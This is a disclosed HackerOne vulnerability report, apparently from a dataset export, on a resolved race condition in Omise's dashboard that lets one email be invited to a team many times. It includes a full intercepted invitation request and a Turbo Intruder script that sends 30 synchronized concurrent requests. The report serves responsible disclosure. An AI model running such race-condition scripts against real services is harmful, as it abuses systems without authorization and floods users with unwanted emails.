---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1285538'
original_report_id: '1285538'
title: 'Race condition on action: Invite members to a team'
weakness: Business Logic Errors
team_handle: omise
created_at: '2021-07-31T15:37:56.591Z'
disclosed_at: '2022-03-22T21:52:00.002Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 11
asset_identifier: dashboard.omise.co
asset_type: URL
max_severity: critical
tags:
- hackerone
- business-logic-errors
---

# Race condition on action: Invite members to a team

## Metadata

- HackerOne Report ID: 1285538
- Weakness: Business Logic Errors
- Program: omise
- Disclosed At: 2022-03-22T21:52:00.002Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

## Summary:
Hello there,

I've found a race condition vulnerability which allows the invitation of the same member multiple times to a single team via the dashboard.

## Tools needed:
 * Burp Suite community edition  with the extension Turbo Intruder.
This is the way I adopted to detect such vulnerability, there is also other ways.

## Steps to reproduce:

  1. Login to an account on omise.co.
  1. Invite a member for testing 
  1. Intercept the main request to the endpoint /team/memberships using the method POST. Modify the HTTP/1.1 protocol for the communication and add `x-request: %s` for Turbo intruder extension. 
```
POST /team/memberships HTTP/2
Host: dashboard.omise.co
Cookie: _gcl_au=1.1.800828746.1627664641; _fbp=fb.1.1627664641735.336224278; _ga=GA1.2.327762462.1627664642; _gid=GA1.2.1231473711.1627664642; __hstc=21908964.e6cfeebc3384c1d9daed7b052f944f26.1627664645060.1627664645060.1627664645060.1; hubspotutk=e6cfeebc3384c1d9daed7b052f944f26; __hssrc=1; locale=en; _omisegateway_session=<SESSION>
Content-Length: 271
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="91", " Not;A Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Upgrade-Insecure-Requests: 1
Origin: https://dashboard.omise.co
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://dashboard.omise.co/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
x-request: %s
Connection: close

authenticity_token=<TOKEN>email=<INVITED-EMAIL>&membership%5Badmin%5D=0&membership%5Badmin%5D=1&membership%5Btechnical%5D=0&membership%5Btechnical%5D=1&commit=Send+invitation
```

  1. Send the modified intercepted request with the invited member to Turbo intruder, and write the following attack code :
```
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=30,
                           requestsPerConnection=100,
                           pipeline=False
                           )

    # the 'gate' argument blocks the final byte of each request until openGate is invoked
    for i in range(30):
        engine.queue(target.req, target.baseInput, gate='race1')

    # wait until every 'race1' tagged request is ready
    # then send the final byte of each request
    # (this method is non-blocking, just like queue)
    engine.openGate('race1')

    engine.complete(timeout=60)

def handleResponse(req, interesting):
    table.add(req)
```

  1. Start the Turbo intruder attack. The results are captured in the following screenshots: 
{F1395233} 
As you can see there is multiple `200 OK` which means a race condition vulnerability happened.

 1. Check the list of invited members to the team. In my case, I used in this attack the invited member : `sim4n6+4@gmail.com`. As you can see the list of invited members to the team is duplicate many times.  
{F1395239}

However, when the invited user is already invited. You get the following error message :
{F1395241}

1. As consequence of the attack, the same email got invited  and received multiple emails as can be seen in the following email:
 {F1395246}

 1. By the way, the bug persists even if the invited member accept the invitation. More invitations will remain in the list of the invited members of the team which is undesirable by design.   

If you need any further details, please let me know.
Regards.

## Impact

Race Condition vulnerability allows the invitation of the same user multiple times.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
